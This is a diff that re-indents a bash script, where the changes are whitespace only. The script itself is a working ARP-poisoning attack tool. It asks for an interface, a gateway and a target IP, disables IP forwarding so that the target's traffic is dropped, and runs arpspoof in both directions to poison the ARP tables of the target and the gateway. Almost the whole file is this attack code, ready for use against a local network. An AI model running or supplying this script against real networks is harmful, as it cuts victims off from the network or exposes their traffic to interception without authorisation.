@@ -20,39 +20,39 @@ echo " "
 
 main() {
 
-		# Make sure only users that got root permissions run this script
+        # Make sure only users that got root permissions run this script
 		
- 		if [ $(id -u) -ne 0 ]; then
- 			    echo " "
-				echo -e "$RED This script has to be runned with root permissions! $ORIGIN" >&2
-				echo " "
-				exit 1;
+ 	if [ $(id -u) -ne 0 ]; then
+ 	        echo " "
+		echo -e "$RED This script has to be runned with root permissions! $ORIGIN" >&2
+		echo " "
+		exit 1;
 
-	    else
+        else
         
         #Getting variables
-		echo "Enter the interface module to be used:";read mod;echo " "
-		echo "Enter the network gateway:";read gw;echo " "
+	echo "Enter the interface module to be used:";read mod;echo " "
+	echo "Enter the network gateway:";read gw;echo " "
     	echo "Enter the target IP:";read target;echo " "
 		
-		sleep 1
-		echo " "
+	sleep 1
+	echo " "
 
-		echo "Assigning 0 to port forward value to deny traffic...";sleep 1
-		sysctl -w net.ipv4.ip_forward=0;sleep 2;echo " "
+	echo "Assigning 0 to port forward value to deny traffic...";sleep 1
+	sysctl -w net.ipv4.ip_forward=0;sleep 2;echo " "
 
-		echo "Poisoning the ARP table with ARP replies...";sleep 2;echo " "
-		echo "Type 'Ctrl + C' to stop the replies and exit...";sleep 2;echo " "
+	echo "Poisoning the ARP table with ARP replies...";sleep 2;echo " "
+	echo "Type 'Ctrl + C' to stop the replies and exit...";sleep 2;echo " "
 
-		echo "### After exiting, the rest of the logs may appear on the screen, be patient and press enter :) ###"
-		echo " ";sleep 2
+	echo "### After exiting, the rest of the logs may appear on the screen, be patient and press enter :) ###"
+	echo " ";sleep 2
 
-		#arpspoofing with dsniff
-		arpspoof -i $mod -t $target $gw &
-		arpspoof -i $mod -t $gw $target &
-		sleep 9999999
+	#arpspoofing with dsniff
+	arpspoof -i $mod -t $target $gw &
+	arpspoof -i $mod -t $gw $target &
+	sleep 9999999
 
-	    fi
+	fi
 }
 
 main
